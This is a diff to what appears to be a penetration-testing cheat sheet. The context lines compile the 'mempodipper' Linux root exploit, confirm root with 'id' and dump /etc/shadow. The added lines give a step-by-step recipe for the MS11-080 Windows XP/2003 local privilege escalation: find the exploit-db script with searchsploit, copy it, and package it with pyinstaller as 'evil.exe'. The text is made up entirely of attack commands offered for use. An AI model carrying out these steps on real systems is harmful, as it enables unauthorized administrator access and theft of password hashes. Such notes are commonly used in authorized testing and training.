@@ -91,3 +91,12 @@ gcc -o mempodipper exploit.c                    # compile exploit
 id                                              # verify root permissions
 cat /etc/shadow
 ------------------------------------------------------------------------------------------------------
+
+# Local Privilege Escaltion - Windows XP, 2003
+
+searchsploit ms11-080
+cp /usr/share/exploitdb/platforms/windows/local/18176.py /root/
+cd /usr/share/pyinstaller/ 
+pyinstaller -F -n evil.exe /root/18176.py
+cp evil.exe/dist/evil.exe /root/
+------------------------------------------------------------------------------------------------------
